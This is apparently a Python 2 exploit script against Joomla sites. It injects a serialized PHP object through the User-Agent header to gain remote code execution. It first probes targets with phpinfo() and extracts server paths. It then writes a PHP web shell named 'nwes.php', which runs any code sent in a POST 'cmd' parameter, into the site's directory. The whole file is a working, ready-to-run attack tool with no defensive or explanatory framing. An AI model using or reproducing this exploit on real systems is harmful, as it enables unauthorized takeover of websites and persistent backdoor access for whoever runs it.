#!/usr/bin/env python
#coding=utf8

import urllib2
import urllib
import re
import cookielib, sys
import requests

def checkJoomlaRCE(url):
    poc = generate_payload("phpinfo();")
    try:
        result = get_url(url, poc)
        if 'phpinfo()' in result:
            system = getInfoByJoomlaRCE(result, 'System')
            document_root = getInfoByJoomlaRCE(result, 'DOCUMENT_ROOT')
            if document_root == 'no info!':
                msg = 'vul, but get shell failed!'
                return False, url,  msg
            script_filename = getInfoByJoomlaRCE(result, 'SCRIPT_FILENAME')
            if script_filename == 'no info!':
                msg = 'vul, but get shell failed!'
                return False, url, msg
            shell_file = getShellByJoomlaRCE(url, system, script_filename)
            if shell_file == 'no info!':
                msg = 'vul, but get shell failed!'
                return False, url, msg
            msg = 'get shell succsss, shell:  %s' %shell_file
            return True, url, msg
        else:
            msg = 'safe'
            return False, url, msg
            # print '[!] no vuls! url: '+url
    except Exception,e:
        msg = str(e)
        return False, url, msg

def getShellByJoomlaRCE(url, system, script_filename):
    if 'no info' not in script_filename and 'no info' not in system:
        if 'Windows' in system:
            shell = script_filename.split('index.php')[0].replace('/','//').strip()+"nwes.php"
        else:
            shell = script_filename.split('index.php')[0]+"nwes.php"
        cmd ="file_put_contents('"+shell+"',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+'));"
        pl = generate_payload(cmd)
        try:
            get_url(url, pl)
            return url+"nwes.php"
        except Exception, e:
            return "no info!"
    else:
        return "no info!"
  
def getInfoByJoomlaRCE(result, param):
    if "System" in param:
        reg = '.*<tr><td class="e">System </td><td class="v">([^<>]*?)</td></tr>.*'
    elif "DOCUMENT_ROOT" in param:
        reg = '.*<tr><td class="e">DOCUMENT_ROOT </td><td class="v">([^<>]*?)</td></tr>.*'
    elif "SCRIPT_FILENAME" in param:
        reg = '.*<tr><td class="e">SCRIPT_FILENAME </td><td class="v">([^<>]*?)</td></tr>.*'
    match_url = re.search(reg,result)
    if match_url:
       info = match_url.group(1)
    else:
        info = 'no info!'
    return info

def get_url(url, user_agent): 
    headers = {
    'User-Agent': user_agent
    }
    cookies = requests.get(url,headers=headers).cookies
    for _ in range(2):
        response = requests.get(url, headers=headers, cookies=cookies)
    return response.content
    
def php_str_noquotes(data):
    "Convert string to chr(xx).chr(xx) for use in php"
    encoded = ""
    for char in data:
        encoded += "chr({0}).".format(ord(char))
    return encoded[:-1]
  
def generate_payload(php_payload): 
    php_payload = "eval({0})".format(php_str_noquotes(php_payload))
    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
  
    return exploit_template
  

#verify vulnerable 
def verify(url):
    cj = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    urllib2.install_opener(opener)
    urllib2.socket.setdefaulttimeout(10)

    ua = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'
    req = urllib2.Request(url=url, headers={'User-Agent': ua})
    opener.open(req)
    req = urllib2.Request(url=url)
    res = opener.open(req).read()
    if '_SERVER["DOCUMENT_ROOT"]' in res:
        msg = 'vul'
        return True, url, msg
    else:
        msg = 'safe'
        return False, url, msg

#exploit vulnerable
def exploit(url):
    res = checkJoomlaRCE(url)
    return res